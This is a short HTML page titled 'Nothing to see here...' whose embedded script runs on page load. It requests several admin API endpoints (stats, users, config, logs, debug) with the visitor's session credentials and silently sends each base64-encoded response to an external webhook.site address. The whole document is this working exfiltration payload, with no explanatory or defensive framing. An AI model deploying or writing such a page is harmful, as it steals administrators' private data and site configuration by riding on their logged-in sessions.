<html>
  <body>
    <h1>Nothing to see here...</h1>
   <script>
  const target = "https://webhook.site/bc672560-c5fa-4777-a425-73efeffffede";
  const endpoints = [
    '/api/admin/stats',
    '/api/admin/users',
    '/api/admin/config',
    '/api/admin/logs',
    '/api/admin/debug'
  ];

  endpoints.forEach(url => {
    fetch(url, { credentials: 'include' })
      .then(r => r.json())
      .then(data => {
        fetch(target + "?path=" + btoa(url) + "&data=" + btoa(JSON.stringify(data)));
      }).catch(e => {});
  });
</script>
  </body>
</html>
